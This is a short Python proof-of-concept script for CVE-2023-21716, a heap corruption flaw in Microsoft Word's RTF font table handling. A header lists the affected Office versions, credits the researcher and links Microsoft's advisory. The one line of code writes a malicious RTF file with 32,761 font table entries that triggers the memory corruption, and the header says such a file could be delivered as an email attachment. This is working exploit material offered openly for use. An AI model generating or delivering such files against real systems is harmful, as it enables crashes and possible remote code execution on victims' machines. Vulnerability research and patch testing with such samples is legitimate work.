'''
Title : CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption

Description : A vulnerability within Microsoft Office's wwlib allows attackers to achieve remote code execution with the privileges of the victim that opens a malicious RTF document. 
    The attacker could deliver this file as an email attachment (or other means).

    This vulnerability affects at least the following versions of Microsoft Office:

        - Microsoft Office 365 (Insider Preview - 2211 Build 15831.20122 CTR)
        - Microsoft Office 2016 (Including Insider Slow - 1704 Build 8067.2032 CTR)
        - Microsoft Office 2013
        - Microsoft Office 2010
        - Microsoft Office 2007

Acknowledgement : This issue was discovered, analyzed, and reported by Joshua J. Drake (@jduck).

Workaround : https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21716
'''

open("POC-CVE-2023-21716.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ]) + "}\n{\\rtlch no crash??}\n}}\n").encode('utf-8'))
